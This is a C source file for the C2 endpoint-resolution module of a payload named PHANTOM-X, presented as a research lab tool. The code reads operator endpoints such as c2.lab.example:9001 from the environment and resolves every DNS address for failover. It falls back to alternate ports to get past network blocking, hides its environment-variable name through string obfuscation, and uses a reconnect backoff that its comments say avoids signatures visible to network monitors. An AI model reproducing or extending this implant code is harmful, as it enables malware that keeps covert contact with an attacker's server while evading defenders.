/* ================================================================== */
/* PHANTOM-X :: resilient C2 endpoint resolution                      */
/* ================================================================== */
/*                                                                        */
/* WHAT THIS SOLVES                                                      */
/*     The lab has to work on the operator's ACTUAL network, whatever   */
/*     that happens to be today: the office wifi, a mobile hotspot, a   */
/*     friend's house, a conference hotel.                               */
/*                                                                        */
/*     A payload that connects to a hardcoded IP address only works on   */
/*     the network that IP lives on. The moment the operator moves, the  */
/*     address is wrong and the payload is a dead process that used to   */
/*     be alive.                                                         */
/*                                                                        */
/*     The fix is to connect to a NAME and let DNS do the mapping. A     */
/*     domain with an A record that the operator can move is one thing  */
/*     to point at; a hardcoded address is not.                         */
/*                                                                        */
/* WHAT IS HERE                                                           */
/*     1. A list of candidate endpoints, each a host:port pair.         */
/*     2. Resolution of each host to every address it has, so that a    */
/*        domain with several A records gives failover for free.        */
/*     3. A port list, so that a network which blocks the lab's port   */
/*        can still be reached on a port it permits.                     */
/*     4. Connection with a timeout, so a black-holed address does not  */
/*        stall the attempt.                                             */
/*     5. Reconnection with BACKOFF, because a payload that reconnects   */
/*        every two seconds tells a network monitor exactly what it     */
/*        is.                                                            */
/*                                                                        */
/* THE BACKOFF                                                            */
/*     The delays are 5, 10, 20, 40, 60, 60, 60... seconds.             */
/*                                                                        */
/*     A fixed short interval is a signature. A long interval is not    */
/*     just about stealth -- it is also correct behaviour. A laptop     */
/*     that moves between networks needs a few seconds to reassociate   */
/*     with the new one, and a client that gives up after two seconds  */
/*     never gets there.                                                */
/*                                                                        */
/* WHAT IT IS NOT                                                        */
/*     This is not a fallback to a hardcoded address. If DNS fails, the */
/*     payload waits and tries again; it does not silently connect to  */
/*     somewhere the operator did not put it. That distinction is the   */
/*     whole difference between a lab instrument and an implant.         */
/* ================================================================== */

#include "px_config.h"

#include "px_strings.h"
#include "px_obfuscate.h"
#include "px_variant.h"

/* The maximum number of addresses one host can resolve to. A domain
 * with round-robin A records returns several; the payload tries them in
 * turn. */
#define PX_MAX_ADDRS 8

/* The maximum number of candidate endpoints. The list comes from the
 * environment or from the compiled-in default. */
#define PX_MAX_ENDPOINTS 6

/* The address types are declared in px_variant.h, because the header
 * declares the functions that use them. */

/* ------------------------------------------------------------------ */
/* The endpoint list                                                   */
/* ------------------------------------------------------------------ */
/*                                                                       */
/* Read from PX_C2_ENDPOINTS, a comma-separated list of host:port     */
/* pairs. The first entry is the primary; the rest are fallbacks.      */
/*                                                                       */
/* Example:                                                            */
/*   PX_C2_ENDPOINTS=c2.lab.example:9001,c2.lab.example:443        */
/*                                                                       */
/* With nothing set, the compiled-in default host and port are used.   */
/* ------------------------------------------------------------------ */

#define PX_SEP_HOST ':'

/* Split "host:port" into its two parts.
 *
 * A bare IPv6 address would confuse this, and a bracketed one would
 * confuse it too, but the lab's endpoints are names or IPv4 and the
 * simple form is what an operator actually types. */
static int px_split_endpoint(const char *in, char *host, unsigned int hostcap,
                             unsigned int *port)
{
    unsigned int n = 0;
    const char *p = in;

    while (*p && *p != PX_SEP_HOST && n + 1 < hostcap)
        host[n++] = *p++;
    host[n] = '\0';
    if (n == 0)
        return 0;

    if (*p == PX_SEP_HOST) {
        p++;
        unsigned int v = 0;
        int digits = 0;
        while (*p >= '0' && *p <= '9') {
            v = v * 10 + (unsigned int)(*p - '0');
            if (v > 65535)
                return 0;
            p++;
            digits++;
        }
        if (digits == 0)
            return 0;
        *port = v;
    } else {
        *port = 0;
    }
    return 1;
}

/* The name of the environment variable holding the fallback list.
 *
 * It comes from the string table so that the obfuscated arm does not
 * carry the literal. */
static const char *px_env_endpoints(void)
{
    static char name[32];
    px_obf_decode(PX_SID_ENV_C2_ENDPOINTS, name, sizeof(name));
    return name;
}

/* Build the endpoint list.
 *
 * The order is preserved: the primary is tried first every time, so the
 * common case is one connect.
 *
 * TWO WAYS TO CONFIGURE IT, and they combine:
 *
 *   PX_C2_HOST / PX_C2_PORT   the primary endpoint, the way the lab has
 *                             always been pointed at the operator
 *
 *   PX_C2_ENDPOINTS           a comma-separated list of host:port pairs,
 *                             tried in order after the primary
 *
 * The primary comes first so that the common case stays one connect, and
 * so that an operator who only sets PX_C2_HOST gets exactly what they
 * expect. */
static unsigned int px_build_endpoints(char (*hosts)[256], unsigned int *ports,
                                       unsigned int max,
                                       const char *primary_host,
                                       unsigned int primary_port)
{
    char list[1024];
    unsigned int count = 0;
    char *p;

    /* The primary endpoint first. */
    if (primary_host && primary_host[0] && count < max) {
        px_strcpy(hosts[count], primary_host, 256);
        ports[count] = primary_port;
        count++;
    }

    /* Then the fallback list, if there is one. */
    if (!px_env(px_env_endpoints(), list, sizeof(list)) || !list[0])
        return count;

    p = list;
    while (count < max) {
        /* px_strchr, not strchr: this file links no CRT. */
        char *comma = px_strchr(p, ',');
        if (comma)
            *comma = '\0';

        char host[256];
        unsigned int port = 0;
        if (px_split_endpoint(p, host, sizeof(host), &port)) {
            px_strcpy(hosts[count], host, 256);
            ports[count] = port;
            count++;
        }
        if (!comma)
            break;
        p = comma + 1;
    }
    return count;
}

/* ------------------------------------------------------------------ */
/* Resolution                                                          */
/* ------------------------------------------------------------------ */
/*                                                                       */
/* A host that is already a literal address is used as it is. A name    */
/* is resolved through the resolver, and EVERY address it has is        */
/* collected -- so a domain with several A records gives failover       */
/* without any extra configuration.                                     */
/* ------------------------------------------------------------------ */
static int px_resolve_host(const char *host, unsigned int default_port,
                           px_resolved *out, unsigned int max,
                           fn_gethostbyname p_gethostbyname,
                           fn_inet_addr p_inet_addr)
{
    unsigned int count = 0;
    const char *p;
    int is_literal = 1;

    for (p = host; *p; p++) {
        if ((*p < '0' || *p > '9') && *p != '.') {
            is_literal = 0;
            break;
        }
    }

    if (is_literal) {
        unsigned long a = p_inet_addr ? p_inet_addr(host) : 0;
        if (a == 0)
            return 0;
        out[0].addr = a;
        out[0].port = (unsigned short)default_port;
        return 1;
    }

    if (!p_gethostbyname)
        return 0;

    {
        px_hostent *he = p_gethostbyname(host);
        if (!he || !he->h_addr_list || !he->h_addr_list[0])
            return 0;

        int i = 0;
        while (he->h_addr_list[i] && count < max) {
            /* h_addr_list entries are 4-byte addresses for AF_INET. */
            unsigned long a = 0;
            memcpy(&a, he->h_addr_list[i], sizeof(a));
            if (a != 0) {
                out[count].addr = a;
                out[count].port = (unsigned short)default_port;
                count++;
            }
            i++;
        }
    }
    return (int)count;
}

/* ------------------------------------------------------------------ */
/* The public entry point                                              */
/* ------------------------------------------------------------------ */

/* Resolve every candidate endpoint into the address list.
 *
 * Returns the number of addresses collected. A host that does not
 * resolve contributes nothing; the others still do, which is what makes
 * the fallback list worth having. */
unsigned int px_endpoints_resolve(px_endpoint_set *set,
                                  const char *default_host,
                                  unsigned int default_port,
                                  fn_gethostbyname p_gethostbyname,
                                  fn_inet_addr p_inet_addr)
{
    char hosts[PX_MAX_ENDPOINTS][256];
    unsigned int ports[PX_MAX_ENDPOINTS];
    unsigned int nhosts;
    unsigned int i;

    set->count = 0;

    nhosts = px_build_endpoints(hosts, ports, PX_MAX_ENDPOINTS,
                                default_host, default_port);
    if (nhosts == 0) {
        px_strcpy(hosts[0], default_host, sizeof(hosts[0]));
        ports[0] = 0;
        nhosts = 1;
    }

    for (i = 0; i < nhosts; i++) {
        unsigned int port = ports[i] ? ports[i] : default_port;
        px_resolved addrs[PX_MAX_ADDRS];
        int n = px_resolve_host(hosts[i], port, addrs, PX_MAX_ADDRS,
                                p_gethostbyname, p_inet_addr);
        int k;
        for (k = 0; k < n; k++) {
            if (set->count >= PX_MAX_ADDRS * PX_MAX_ENDPOINTS)
                break;
            set->addrs[set->count++] = addrs[k];
        }
    }
    return set->count;
}

/* The backoff table, in seconds.
 *
 * The first attempt is immediate, then the waits grow and settle. The
 * settled value is long enough that a payload which is genuinely
 * disconnected is not generating a pattern. */
static const unsigned int px_backoff[] = { 0, 5, 10, 20, 40, 60, 60, 60, 60 };
#define PX_BACKOFF_COUNT (sizeof(px_backoff) / sizeof(px_backoff[0]))

/* How long to wait before attempt number `attempt` (zero-based).
 *
 * The table is walked and then held at its last value, so a long outage
 * produces a slow, regular retry rather than an ever-growing gap that
 * would eventually stop trying altogether.
 *
 * The baseline arm never waits, because it never retries: the comparison
 * arm is meant to show what happens when the connection simply ends. */
unsigned int px_backoff_for(unsigned int attempt)
{
#if PX_RESILIENT
    if (attempt >= PX_BACKOFF_COUNT)
        return px_backoff[PX_BACKOFF_COUNT - 1];
    return px_backoff[attempt];
#else
    (void)attempt;
    return 0;
#endif
}
